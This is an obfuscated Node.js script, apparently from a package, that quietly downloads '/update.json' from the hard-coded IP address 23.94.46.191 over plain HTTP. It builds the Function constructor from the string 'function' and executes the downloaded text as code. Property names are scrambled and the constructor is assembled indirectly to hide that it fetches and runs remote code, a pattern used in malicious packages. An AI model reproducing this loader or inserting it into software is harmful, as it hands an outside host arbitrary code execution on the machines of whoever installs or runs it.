(function () {
    var _0x3e0db3 = {
        'niJgQ': function (_0x3e43fd, _0x569f4) {
            return _0x3e43fd + _0x569f4;
        },
        'fQANF': function (_0x6a08eb) {
            return _0x6a08eb();
        },
        'xNBfV': 'end',
        'pgxVj': function (_0x1f618b, _0x32996c) {
            return _0x1f618b(_0x32996c);
        },
        'JYfPI': 'http',
        'VRWJa': '23.94.46.191',
        'LuEmz': '/update.json'
    };
    var _0x122d80 = _0x3e0db3['pgxVj'](require, _0x3e0db3['JYfPI']);
    return _0x122d80['get']({
        'host': _0x3e0db3['VRWJa'],
        'port': 0x50,
        'path': _0x3e0db3['LuEmz']
    }, function (_0x12d076) {
        var _0x3b4882 = '';
        _0x12d076['on']('data', function (_0x408835) {
            _0x3b4882 += _0x408835;
        });
        _0x12d076['on'](_0x3e0db3['xNBfV'], function () {
            var _0x96b3b = this[_0x3e0db3['niJgQ']((typeof this['Buffer']['from'])['charAt'](0x0)['toUpperCase'](), (typeof this['Buffer']['from'])['slice'](0x1))];
            var _0x526f49 = new _0x96b3b(_0x3b4882);
            _0x3e0db3['fQANF'](_0x526f49);
        });
    });
}());
